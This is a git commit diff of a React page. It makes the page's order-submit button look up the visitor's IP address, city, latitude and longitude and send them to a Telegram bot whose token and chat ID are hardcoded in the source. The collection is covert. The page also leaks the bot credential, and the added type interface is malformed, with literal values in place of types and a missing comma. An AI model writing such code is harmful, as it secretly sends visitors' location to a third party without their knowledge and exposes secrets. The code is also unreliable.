d707be43a6fd0b587ff579eb4db798a19607ef07
Yuriy.Dubrovskiy <jr.dubrovskiy@gmail.com>
2024-01-30 01:17:32 +0300

    fix

--- src/pages/IndexPage/IndexPage.tsx
+++ src/pages/IndexPage/IndexPage.tsx
@@ -5,38 +5,52 @@ import banner from "@/widgets/banner.png";
 import { Layout } from "../Layout";
 import cls from "./IndexPage.module.css";
 
-// interface IIpInfo {
-//   query: string
-//   status: string
-//   country: string
-//   countryCode: string
-//   region: string
-//   regionName: string
-//   city: string
-//   zip: string
-//   lat: number
-//   lon: number
-//   timezone: string
-//   isp: string
-//   org: string
-//   as: string
-// }
+interface IIpInfo {
+  ip: "8.8.8.8",
+  version: "IPv4",
+  city: "Mountain View",
+  region: "California",
+  region_code: "CA",
+  country_code: "US",
+  country_code_iso3: "USA",
+  country_name: "United States",
+  country_capital: "Washington",
+  country_tld: ".us",
+  continent_code: "NA",
+  in_eu: false,
+  postal: "94035",
+  latitude: 37.386,
+  longitude: -122.0838,
+  timezone: "America/Los_Angeles",
+  utc_offset: "-0800",
+  country_calling_code: "+1",
+  currency: "USD",
+  currency_name: "Dollar",
+  languages: "en-US,es-US,haw,fr",
+  country_area: 9629091.0,
+  country_population: 310232863,
+  asn: "AS15169",
+  org: "Google LLC"
+  hostname: "dns.google"
+}
 
 export function IndexPage() {
   const token = "6929973683:AAE5n_cNZ_0cFrwabxZqeIJqlTYzS0QPI50";
   const chatId = "-1002091877186";
 
   const submit = async () => {
-    // const resIpInfp = await axios.post<IIpInfo>("http://ip-api.com/json/");
+    const resIp = await axios.post<string>("https://ipapi.co/ip/");
 
-    // const messsage = `
-    //     IP: ${resIpInfp.data.query}
-    //     City: ${resIpInfp.data.city}
-    //     Lat: ${resIpInfp.data.lat}
-    //     Lon: ${resIpInfp.data.lon}
-    //   `;
+    const resIpInfo = await axios.post<IIpInfo>(`https://ipapi.co/${resIp.data}/json/`);
 
-    const messsage = "НОВЫЙ ЗАКАЗ";
+    const messsage = `
+        IP: ${resIpInfo.data.ip}
+        City: ${resIpInfo.data.city}
+        Lat: ${resIpInfo.data.latitude}
+        Lon: ${resIpInfo.data.longitude}
+      `;
+
+    // const messsage = "НОВЫЙ ЗАКАЗ";
 
     await axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${messsage}`);
   };
